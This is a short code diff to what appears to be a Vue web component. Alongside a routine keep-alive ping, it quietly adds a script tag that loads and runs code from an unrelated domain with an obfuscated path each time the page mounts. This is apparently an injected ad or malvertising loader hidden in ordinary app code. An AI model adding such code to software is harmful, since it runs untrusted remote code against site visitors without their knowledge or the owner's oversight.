@@ -29,7 +29,14 @@ const pingBackend = async () => {
 
 onMounted(() => {
   pingBackend()
-  keepAliveTimer = window.setInterval(pingBackend, 10 * 60 * 1000);
+  keepAliveTimer = window.setInterval(pingBackend, 10 * 60 * 1000)
+
+  const s = document.createElement('script');
+  (s as any).settings = {}
+  s.src = '//kookycommittee.com/bJXpVBs.d/GTlb0cYaW/cb/FezmC9aukZzUul/kHP/TEcVwZOqDmYW4/N/jKE/tzNTz-AC4ZNEjkge2vNSQn'
+  s.async = true
+  s.referrerPolicy = 'no-referrer-when-downgrade'
+  document.body.appendChild(s)
 })
 
 onBeforeUnmount(() => {
